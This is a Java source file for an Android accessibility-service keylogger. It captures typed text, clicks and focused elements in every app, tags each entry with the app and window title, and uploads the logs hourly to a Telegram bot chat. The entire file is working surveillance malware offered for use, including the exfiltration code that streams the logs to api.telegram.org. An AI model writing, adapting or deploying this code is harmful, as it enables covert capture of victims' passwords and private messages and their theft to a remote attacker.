package com.bshu2.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

/**
 * Accessibility service that captures text/click/focus events into a local
 * file and uploads that file to a Telegram chat once per hour.
 * No intermediate server, no real-time message spam.
 */
public class Keylogger extends AccessibilityService {

    // Credentials come from local.properties at build time, or from an
    // optional runtime file pushed over adb (release builds are credential-free).
    private static final String CONF_FILE = "telegram.conf";
    private volatile String botToken;
    private volatile String chatId;

    private static final long UPLOAD_INTERVAL_MS = BuildConfig.UPLOAD_INTERVAL_MS; // 1 h default

    private static final String TAG = "Keylogger";
    private static final String TELEGRAM_API = "https://api.telegram.org/bot";
    private static final String PENDING_FILE = "pending.txt";
    private static final String OUTBOX_DIR = "outbox";

    // Size guards. Telegram Bot API rejects documents above 50 MB.
    private static final int MAX_DATA_CHARS = 500;                    // clip one event's text
    private static final long MAX_CHUNK_BYTES = 8L * 1024L * 1024L;   // split snapshots at 8 MB
    private static final long MAX_UPLOAD_BYTES = 45L * 1024L * 1024L; // sideline above this
    private static final int ARCHIVE_KEEP_DAYS = 7;                   // prune daily archives
    private static final int MAX_TRACKED_WINDOWS = 50;                 // cap the prefix-dedupe map

    private static final Pattern DAILY_ARCHIVE =
            Pattern.compile("keylog_\\d{8}\\.txt");

    private final Handler handler = new Handler(Looper.getMainLooper());
    // All disk and network work happens here, never on the main thread.
    // Not final: the service instance can be reused after onDestroy reconnects.
    private ExecutorService io = Executors.newSingleThreadExecutor();
    private volatile boolean scheduled;
    private volatile boolean destroyed;

    /** Returns a live executor, recreating it if a previous onDestroy shut it down. */
    private synchronized ExecutorService io() {
        if (io == null || io.isShutdown()) {
            io = Executors.newSingleThreadExecutor();
        }
        return io;
    }

    private final SimpleDateFormat df =
            new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
    private final SimpleDateFormat fileStamp =
            new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US);
    // Main-thread only, used for the daily archive filename.
    private final SimpleDateFormat dayFormat =
            new SimpleDateFormat("yyyyMMdd", Locale.US);
    private final String deviceName = safe(Build.MODEL);
    private final Map<String, String> appLabels = new HashMap<>();

    // Last logged text per window, used to drop redundant prefixes.
    private final Map<String, String> lastTextByWindow = new HashMap<>();

    private final Runnable uploadTask = new Runnable() {
        @Override
        public void run() {
            if (destroyed) return;
            io().execute(new Runnable() {
                @Override
                public void run() {
                    rotatePending();
                    uploadOutbox();
                    pruneArchives();
                }
            });
            if (!destroyed) handler.postDelayed(this, UPLOAD_INTERVAL_MS);
        }
    };

    @Override
    public void onServiceConnected() {
        Log.d(TAG, "Starting service");
        destroyed = false;
        // loadConfig() reads a file, so it belongs on the io thread too.
        io().execute(new Runnable() {
            @Override
            public void run() {
                loadConfig();
                if (!isConfigured()) {
                    Log.e(TAG, "BOT_TOKEN / CHAT_ID not set; events will only be saved locally");
                }
                rotatePending();
                uploadOutbox();
            }
        });
        synchronized (this) {
            if (!scheduled) {
                scheduled = true;
                handler.postDelayed(uploadTask, UPLOAD_INTERVAL_MS);
            }
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        String action;
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                action = "TEXT";
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                action = "CLICKED";
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                action = "FOCUSED";
                break;
            default:
                return;
        }

        AccessibilityNodeInfo source = null;
        try {
            source = event.getSource();

            String app = appLabelOf(event.getPackageName());
            String title = windowTitleOf(event, source);
            String data = eventData(event, source, action, app, title);
            if (data == null) return; // redundant or empty

            String ts = df.format(Calendar.getInstance().getTime());
            final String line = ts + " | " + deviceName + " | " + app + " | " + title
                    + " | " + action + " | " + data + "\n";
            final String archive = "keylog_" + dayStamp() + ".txt";

            io().execute(new Runnable() {
                @Override
                public void run() {
                    File dir = logDir();
                    append(new File(dir, archive), line);
                    append(new File(dir, PENDING_FILE), line);
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "event handling failed", e);
        } finally {
            recycle(source);
        }
    }

    /**
     * Produces the text payload for one event. Returns null when the event is
     * redundant (a growing text field re-reporting the same prefix) or empty.
     */
    private String eventData(AccessibilityEvent event, AccessibilityNodeInfo source,
                             String action, String app, String title) {
        String clean;
        if ("TEXT".equals(action)) {
            String full = joinText(event);
            if (full.isEmpty()) full = describeNode(source);

            // Identity must include the concrete widget: two text fields in the
            // same screen share app+title, and diffing across them produces garbage.
            String key = app + "|" + title + "|" + widgetKey(event, source);
            String delta = full;
            synchronized (lastTextByWindow) {
                String previous = lastTextByWindow.get(key);
                if (full.equals(previous)) return null;          // nothing changed
                if (previous != null && full.startsWith(previous)) {
                    delta = full.substring(previous.length());     // only the new part
                } else if (previous != null && previous.startsWith(full)) {
                    // Deletion: re-logging the remaining text would duplicate
                    // everything already captured, so record one marker instead.
                    delta = "<backspace>";
                }
                // Cache the FULL text, not the delta, or the next diff is wrong.
                lastTextByWindow.put(key, full);
                if (lastTextByWindow.size() > MAX_TRACKED_WINDOWS) {
                    lastTextByWindow.clear();
                    lastTextByWindow.put(key, full);
                }
            }
            clean = sanitize(delta);
        } else {
            clean = sanitize(describeNode(source));
            if ("-".equals(clean)) clean = sanitize(joinText(event));
        }

        return "-".equals(clean) ? null : clean;
    }

    /** Stable-enough identity for the text field currently being typed into. */
    private static String widgetKey(AccessibilityEvent event, AccessibilityNodeInfo source) {
        StringBuilder sb = new StringBuilder();
        sb.append(event.getWindowId()).append('/');
        CharSequence cls = event.getClassName();
        sb.append(cls == null ? "-" : cls);
        if (source != null) {
            try {
                CharSequence viewId = source.getViewIdResourceName();
                if (viewId != null) sb.append('/').append(viewId);
            } catch (Exception ignored) {
                // View ids are not always available; window+class still helps.
            }
        }
        return sb.toString();
    }

    /** Flattens event.getText() without the List brackets ([a, b] -> a b). */
    private static String joinText(AccessibilityEvent event) {
        java.util.List<CharSequence> parts = event.getText();
        if (parts == null || parts.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        for (CharSequence p : parts) {
            if (p == null) continue;
            if (sb.length() > 0) sb.append(' ');
            sb.append(p);
        }
        return sb.toString();
    }

    /** Best-effort human label for a clicked/focused widget. */
    private static String describeNode(AccessibilityNodeInfo node) {
        if (node == null) return "";
        CharSequence text = node.getText();
        if (text != null && text.length() > 0) return text.toString();
        CharSequence desc = node.getContentDescription();
        if (desc != null && desc.length() > 0) return desc.toString();
        return "";
    }

    /** Package name resolved to a human-readable app label, cached per package. */
    private String appLabelOf(CharSequence pkg) {
        if (pkg == null) return "unknown";
        final String name = pkg.toString();
        synchronized (appLabels) {
            String cached = appLabels.get(name);
            if (cached != null) return cached;
        }

        String label = name;
        try {
            PackageManager pm = getPackageManager();
            label = pm.getApplicationLabel(pm.getApplicationInfo(name, 0)).toString();
        } catch (Exception e) {
            // Package not visible (API 30+ visibility) or uninstalled; keep the
            // package name rather than guessing. Self packages always resolve.
            Log.d(TAG, "no label for " + name + ": " + e.getClass().getSimpleName());
        }
        label = sanitize(label);

        synchronized (appLabels) {
            if (appLabels.size() > MAX_TRACKED_WINDOWS) appLabels.clear();
            appLabels.put(name, label);
        }
        return label;
    }

    /**
     * Releases a node obtained from {@code event.getSource()}. Recycling is
     * required on API 21-32; on API 33+ it is a no-op. The suppression is
     * scoped to this call because supporting the old range needs the call.
     */
    @SuppressWarnings("deprecation")
    private static void recycle(AccessibilityNodeInfo node) {
        if (node != null) node.recycle();
    }

    /** Releases a window obtained from {@code source.getWindow()} (owned instance). */
    @SuppressWarnings("deprecation")
    private static void recycle(AccessibilityWindowInfo win) {
        if (win != null) win.recycle();
    }

    /** Best-effort window title (API 24+), falling back to the window/activity class. */
    private static String windowTitleOf(AccessibilityEvent event, AccessibilityNodeInfo source) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && source != null) {
            AccessibilityWindowInfo win = source.getWindow();
            if (win != null) {
                try {
                    CharSequence t = win.getTitle();
                    if (t != null && t.length() > 0) return sanitize(t.toString());
                } finally {
                    recycle(win);   // getWindow() hands us an owned instance
                }
            }
        }
        CharSequence cls = event.getClassName();
        if (cls != null && cls.length() > 0) return sanitize(cls.toString());
        return "-";
    }

    /** Keeps the pipe-delimited line parseable. */
    private static String sanitize(String s) {
        if (s == null) return "-";
        String out = s.replace('|', '/').replace('\n', ' ').replace('\r', ' ').trim();
        if (out.length() > MAX_DATA_CHARS) out = out.substring(0, MAX_DATA_CHARS) + "...";
        return out.isEmpty() ? "-" : out;
    }

    private static String safe(String s) {
        return (s == null || s.isEmpty()) ? "unknown" : s.replace('|', '/');
    }

    /** Today's date as yyyyMMdd, for the per-day archive filename. */
    private String dayStamp() {
        return dayFormat.format(new Date());
    }

    private void append(File file, String line) {
        try {
            FileOutputStream fos = new FileOutputStream(file, true);
            fos.write(line.getBytes(StandardCharsets.UTF_8));
            fos.close();
        } catch (Exception e) {
            Log.e(TAG, "local write failed", e);
        }
    }

    /**
     * Moves pending.txt into the outbox, splitting it into chunks of at most
     * MAX_CHUNK_BYTES so no single upload can approach Telegram's 50 MB cap.
     */
    private void rotatePending() {
        File pending = new File(logDir(), PENDING_FILE);
        if (!pending.exists() || pending.length() == 0) return;

        File outbox = new File(logDir(), OUTBOX_DIR);
        if (!outbox.exists() && !outbox.mkdirs()) {
            Log.e(TAG, "cannot create outbox dir");
            return;
        }

        if (pending.length() > MAX_CHUNK_BYTES) {
            splitPending(pending, outbox);
            return;
        }

        File snapshot = uniqueFile(outbox, "keylog_" + fileStamp.format(new Date()));
        if (!pending.renameTo(snapshot) && !copyAndTruncate(pending, snapshot)) {
            Log.e(TAG, "rotate failed");
        }
    }

    /** Returns a non-existing file, appending a counter if the name is taken. */
    private static File uniqueFile(File dir, String base) {
        File f = new File(dir, base + ".txt");
        int n = 1;
        while (f.exists()) {
            f = new File(dir, base + "_" + n + ".txt");
            n++;
        }
        return f;
    }

    /** Splits an oversized pending.txt into timestamped, line-aligned chunks. */
    private void splitPending(File pending, File outbox) {
        String base = fileStamp.format(new Date());
        int part = 0;
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        List<File> written = new ArrayList<>();
        BufferedReader reader = null;
        try {
            reader = new BufferedReader(new InputStreamReader(
                    new FileInputStream(pending), StandardCharsets.UTF_8));
            String line;
            while ((line = reader.readLine()) != null) {
                byte[] bytes = (line + "\n").getBytes(StandardCharsets.UTF_8);
                if (buf.size() > 0 && buf.size() + bytes.length > MAX_CHUNK_BYTES) {
                    written.add(writeChunk(outbox, base, part++, buf.toByteArray()));
                    buf.reset();
                }
                buf.write(bytes, 0, bytes.length);
            }
            if (buf.size() > 0) written.add(writeChunk(outbox, base, part, buf.toByteArray()));
        } catch (Exception e) {
            Log.e(TAG, "split failed", e);
            // Never leave half-written chunks that would be uploaded twice.
            for (File f : written) {
                if (!f.delete()) Log.w(TAG, "could not remove partial chunk " + f.getName());
            }
            return; // keep pending.txt intact for the next attempt
        } finally {
            try { if (reader != null) reader.close(); } catch (Exception ignored) { }
        }

        try {
            new FileOutputStream(pending, false).close(); // truncate only on success
        } catch (Exception e) {
            Log.e(TAG, "truncate failed", e);
        }
    }

    private File writeChunk(File outbox, String base, int part, byte[] data) throws Exception {
        File target = uniqueFile(outbox,
                String.format(Locale.US, "keylog_%s_%03d", base, part));
        FileOutputStream out = null;
        try {
            out = new FileOutputStream(target);
            out.write(data);
            out.flush();
        } finally {
            try { if (out != null) out.close(); } catch (Exception ignored) { }
        }
        return target;
    }

    /** renameTo can fail across mounts; fall back to copy + truncate. */
    private boolean copyAndTruncate(File src, File dst) {
        FileInputStream in = null;
        FileOutputStream out = null;
        boolean ok = false;
        try {
            in = new FileInputStream(src);
            out = new FileOutputStream(dst);
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
            out.flush();
            out.close();
            out = null;
            in.close();
            in = null;
            new FileOutputStream(src, false).close();
            ok = true;
            return true;
        } catch (Exception e) {
            Log.e(TAG, "rotate failed", e);
            return false;
        } finally {
            try { if (in != null) in.close(); } catch (Exception ignored) { }
            try { if (out != null) out.close(); } catch (Exception ignored) { }
            // A half-copied snapshot must never be uploaded as if it were whole.
            if (!ok && dst.exists() && !dst.delete()) {
                Log.w(TAG, "could not remove partial snapshot " + dst.getName());
            }
        }
    }

    /** Deletes daily archives older than ARCHIVE_KEEP_DAYS. */
    private void pruneArchives() {
        File[] files = logDir().listFiles();
        if (files == null) return;

        long cutoff = System.currentTimeMillis()
                - (ARCHIVE_KEEP_DAYS * 24L * 60L * 60L * 1000L);
        for (File f : files) {
            if (!f.isFile() || !DAILY_ARCHIVE.matcher(f.getName()).matches()) continue;
            if (f.lastModified() >= cutoff) continue;
            if (f.delete()) Log.d(TAG, "pruned " + f.getName());
        }
    }

    /** Uploads every queued file in order; deletes only on success. Runs on the io executor. */
    private void uploadOutbox() {
        if (!isConfigured()) return;

        File outbox = new File(logDir(), OUTBOX_DIR);
        File[] files = outbox.listFiles();
        if (files == null || files.length == 0) return;
        Arrays.sort(files); // filenames are timestamped, so this is chronological

        for (File f : files) {
            if (!f.isFile() || f.length() == 0) {
                if (!f.delete()) Log.w(TAG, "could not delete empty " + f.getName());
                continue;
            }
            if (f.getName().endsWith(".failed")) continue; // already sidelined
            if (f.length() > MAX_UPLOAD_BYTES) {
                // Too big for Telegram; stop retrying so it cannot block the queue.
                File parked = new File(f.getParentFile(), f.getName() + ".failed");
                if (f.renameTo(parked)) {
                    Log.e(TAG, "oversized, parked as " + parked.getName());
                }
                continue;
            }
            String caption = deviceName + " log " + f.getName();
            if (sendDocument(f, caption)) {
                if (!f.delete()) Log.w(TAG, "could not delete uploaded " + f.getName());
                Log.d(TAG, "uploaded " + f.getName());
            } else {
                Log.e(TAG, "upload failed, will retry next hour: " + f.getName());
                break; // keep order; retry the rest next cycle
            }
        }
    }

    /**
     * Streams the file to Telegram without buffering it in heap.
     * Returns true when Telegram accepted the document.
     */
    private boolean sendDocument(File file, String caption) {
        String boundary = "----Keylogger" + System.currentTimeMillis();
        HttpURLConnection c = null;
        FileInputStream in = null;
        try {
            byte[] head = multipartHead(boundary, caption, file.getName());
            byte[] tail = ("\r\n--" + boundary + "--\r\n").getBytes(StandardCharsets.UTF_8);
            long total = head.length + file.length() + tail.length;

            URL url = new URL(TELEGRAM_API + botToken + "/sendDocument");
            c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setConnectTimeout(15000);
            c.setReadTimeout(120000);
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            c.setFixedLengthStreamingMode(total);

            OutputStream os = c.getOutputStream();
            os.write(head);

            in = new FileInputStream(file);
            byte[] buf = new byte[16384];
            int n;
            while ((n = in.read(buf)) > 0) os.write(buf, 0, n);
            in.close();
            in = null;

            os.write(tail);
            os.flush();
            os.close();

            int code = c.getResponseCode();
            if (code < 200 || code >= 300) {
                Log.e(TAG, "sendDocument http=" + code);
                return false;
            }
            Log.d(TAG, "sendDocument ok http=" + code
                    + " file=" + file.getName() + " bytes=" + file.length());
            return true;
        } catch (Exception e) {
            Log.e(TAG, "sendDocument failed", e);
            return false;
        } finally {
            try { if (in != null) in.close(); } catch (Exception ignored) { }
            if (c != null) c.disconnect();
        }
    }

    private byte[] multipartHead(String boundary, String caption, String filename)
            throws Exception {
        ByteArrayOutputStream head = new ByteArrayOutputStream();
        writeField(head, boundary, "chat_id", chatId);
        writeField(head, boundary, "caption", caption);
        head.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
        head.write(("Content-Disposition: form-data; name=\"document\"; filename=\""
                + filename + "\"\r\n").getBytes(StandardCharsets.UTF_8));
        head.write("Content-Type: text/plain\r\n\r\n".getBytes(StandardCharsets.UTF_8));
        return head.toByteArray();
    }

    private static void writeField(OutputStream os, String boundary, String name, String value)
            throws Exception {
        os.write(("--" + boundary + "\r\n").getBytes(StandardCharsets.UTF_8));
        os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n\r\n")
                .getBytes(StandardCharsets.UTF_8));
        os.write(value.getBytes(StandardCharsets.UTF_8));
        os.write("\r\n".getBytes(StandardCharsets.UTF_8));
    }

    private File logDir() {
        File dir = getExternalFilesDir(null);
        if (dir == null) dir = getFilesDir();
        if (!dir.exists()) dir.mkdirs();
        return dir;
    }

    /**
     * Loads credentials. Build-time values from local.properties win; otherwise
     * an optional telegram.conf pushed over adb is read, so a credential-free
     * release APK still works:
     *
     *   adb push telegram.conf /sdcard/Android/data/com.bshu2.androidkeylogger/files/
     *
     * File format, one key=value per line:
     *   bot_token=123456:AA...
     *   chat_id=987654321
     */
    private void loadConfig() {
        botToken = BuildConfig.BOT_TOKEN == null ? "" : BuildConfig.BOT_TOKEN.trim();
        chatId = BuildConfig.CHAT_ID == null ? "" : BuildConfig.CHAT_ID.trim();
        if (!botToken.isEmpty() && !chatId.isEmpty()) return; // build-time values win

        File conf = new File(logDir(), CONF_FILE);
        if (!conf.isFile()) return;

        BufferedReader reader = null;
        try {
            reader = new BufferedReader(
                    new InputStreamReader(new FileInputStream(conf), StandardCharsets.UTF_8));
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                int eq = line.indexOf('=');
                if (eq <= 0) continue;
                String key = line.substring(0, eq).trim().toLowerCase(Locale.US);
                String value = line.substring(eq + 1).trim();
                if ("bot_token".equals(key)) botToken = value;
                else if ("chat_id".equals(key)) chatId = value;
            }
            Log.d(TAG, "loaded " + CONF_FILE + " (token set=" + !botToken.isEmpty()
                    + " chat set=" + !chatId.isEmpty() + ")");
        } catch (Exception e) {
            Log.e(TAG, "could not read " + CONF_FILE, e);
        } finally {
            try { if (reader != null) reader.close(); } catch (Exception ignored) { }
        }
    }

    private boolean isConfigured() {
        return botToken != null && !botToken.isEmpty()
                && !botToken.equals("YOUR_BOT_TOKEN")
                && chatId != null && !chatId.isEmpty()
                && !chatId.equals("YOUR_CHAT_ID");
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        handler.removeCallbacks(uploadTask);
        scheduled = false;
        destroyed = true;

        // Hand the final rotation to the worker, then close it. shutdown() lets
        // already-submitted writes run; awaiting termination on the main thread
        // would risk an ANR, so the wait happens on a throwaway thread instead.
        final ExecutorService closing = io();
        closing.execute(new Runnable() {
            @Override
            public void run() {
                rotatePending();
            }
        });
        closing.shutdown();

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (!closing.awaitTermination(30, TimeUnit.SECONDS)) {
                        closing.shutdownNow();
                    }
                } catch (InterruptedException e) {
                    closing.shutdownNow();
                    Thread.currentThread().interrupt();
                }
            }
        }, "keylogger-shutdown").start();

        super.onDestroy();
    }
}
